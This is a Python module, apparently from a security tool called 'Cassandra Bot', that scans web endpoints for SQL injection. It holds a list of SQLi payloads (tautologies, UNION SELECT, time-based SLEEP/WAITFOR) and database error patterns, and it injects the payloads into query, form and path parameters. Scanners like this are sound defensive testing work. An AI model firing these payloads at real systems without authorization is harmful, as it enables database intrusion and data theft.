"""Cassandra Bot — SQLi 스캐너."""
import httpx
from core.models import Asset, Endpoint, Finding
from core.logger import get_logger

log = get_logger("scanner.sqli")

SQLI_PAYLOADS = [
    ("' OR '1'='1", "boolean-based"),
    ("' OR 1=1--", "comment-based"),
    ("1' AND '1'='1", "tautology"),
    ("1 AND 1=1", "numeric tautology"),
    ("1 AND 1=2", "numeric false"),
    ("' UNION SELECT NULL--", "union-based"),
    ("1 UNION SELECT NULL--", "numeric union"),
    ("'; WAITFOR DELAY '0:0:5'--", "time-based MSSQL"),
    ("1' AND SLEEP(5)--", "time-based MySQL"),
    ("' OR ''='", "string bypass"),
]

ERROR_PATTERNS = [
    "sql syntax",
    "sqlstate",
    "mysql_fetch",
    "pg_query",
    "sqlite3.OperationalError",
    "ORA-",
    "Unclosed quotation mark",
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "PostgreSQL:",
    "SQLite format error",
    "com.mysql.jdbc",
    "System.Data.SqlClient",
]


def scan_sqli(asset: Asset, endpoint: Endpoint, client: httpx.Client) -> list[Finding]:
    """SQLi 스캔: 각 파라미터에 payload 주입, 응답 비교."""
    findings = []
    base_url = endpoint.url or asset.base_url

    # Baseline request (complete form: first param = "1", others = name-as-value)
    if endpoint.params:
        baseline = _request(client, base_url, endpoint.method, _build_params(endpoint, endpoint.params[0], "1"))
    else:
        baseline = _request(client, base_url, endpoint.method, {})
    if baseline is None:
        return findings

    # 1. Query parameter injection (send complete form: target=payload, others=name)
    if endpoint.params:
        for param in endpoint.params:
            for payload, technique in SQLI_PAYLOADS:
                params = _build_params(endpoint, param, payload)
                resp = _request(client, base_url, endpoint.method, params)
                if resp is None:
                    continue

                # Check for SQL errors
                body = resp.text.lower()
                for pattern in ERROR_PATTERNS:
                    if pattern.lower() in body:
                        finding = Finding(
                            asset_id=asset.id,
                            vuln_type="sqli",
                            severity="high",
                            endpoint=base_url,
                            method=endpoint.method,
                            evidence=f"SQL error detected: '{pattern}' in response (technique: {technique})",
                            poc_request={
                                "method": endpoint.method,
                                "url": base_url,
                                "params": params,
                            },
                            raw_data={"technique": technique, "status": resp.status_code},
                        )
                        findings.append(finding)
                        break

                # Check for boolean-based (response length difference)
                if len(resp.text) > len(baseline.text) * 1.05:
                    finding = Finding(
                        asset_id=asset.id,
                        vuln_type="sqli",
                        severity="medium",
                        endpoint=base_url,
                        method=endpoint.method,
                        evidence=f"Response length anomaly: baseline={len(baseline.text)}, payload={len(resp.text)} (technique: {technique})",
                        poc_request={
                            "method": endpoint.method,
                            "url": base_url,
                            "params": params,
                        },
                        raw_data={"technique": technique, "status": resp.status_code},
                    )
                    findings.append(finding)

    # 2. Path parameter injection (e.g., /api/Products/1)
    path_params = _extract_path_params(base_url)
    for path_param in path_params:
        for payload, technique in SQLI_PAYLOADS:
            # Replace path parameter with URL-encoded payload
            from urllib.parse import quote
            encoded_payload = quote(payload, safe="")
            test_url = base_url.replace(f"/{path_param}", f"/{encoded_payload}", 1)
            resp = _request(client, test_url, endpoint.method, {})
            if resp is None:
                continue

            # Check for SQL errors
            body = resp.text.lower()
            for pattern in ERROR_PATTERNS:
                if pattern.lower() in body:
                    finding = Finding(
                        asset_id=asset.id,
                        vuln_type="sqli",
                        severity="high",
                        endpoint=base_url,
                        method=endpoint.method,
                        evidence=f"SQL error detected in path parameter: '{pattern}' in response (technique: {technique})",
                        poc_request={
                            "method": endpoint.method,
                            "url": test_url,
                        },
                        raw_data={"technique": technique, "status": resp.status_code},
                    )
                    findings.append(finding)
                    break

            # Check for boolean-based (response length difference)
            if len(resp.text) > len(baseline.text) * 1.5:
                finding = Finding(
                    asset_id=asset.id,
                    vuln_type="sqli",
                    severity="medium",
                    endpoint=base_url,
                    method=endpoint.method,
                    evidence=f"Response length anomaly in path parameter: baseline={len(baseline.text)}, payload={len(resp.text)} (technique: {technique})",
                    poc_request={
                        "method": endpoint.method,
                        "url": test_url,
                    },
                    raw_data={"technique": technique, "status": resp.status_code},
                )
                findings.append(finding)

    log.info("sqli: %d findings on %s", len(findings), base_url)
    return findings


def _build_params(endpoint: Endpoint, target: str, value: str) -> dict:
    """완전한 폼 파라미터: target=value, 나머지는 이름(버튼 기본값)."""
    return {p: (value if p == target else p) for p in endpoint.params}


def _extract_path_params(url: str) -> list[str]:
    """Extract numeric path parameters from URL (e.g., /api/Products/1 → ['1'])."""
    import re
    from urllib.parse import urlparse
    parsed = urlparse(url)
    path = parsed.path
    # Find numeric segments in path
    matches = re.findall(r'/(\d+)', path)
    return matches


def _request(client: httpx.Client, url: str, method: str, params: dict) -> httpx.Response | None:
    try:
        if method.upper() == "GET":
            return client.get(url, params=params, timeout=10)
        elif method.upper() == "POST":
            return client.post(url, data=params, timeout=10)
        return client.get(url, params=params, timeout=10)
    except Exception as e:
        log.debug("request failed: %s %s: %s", method, url, e)
        return None
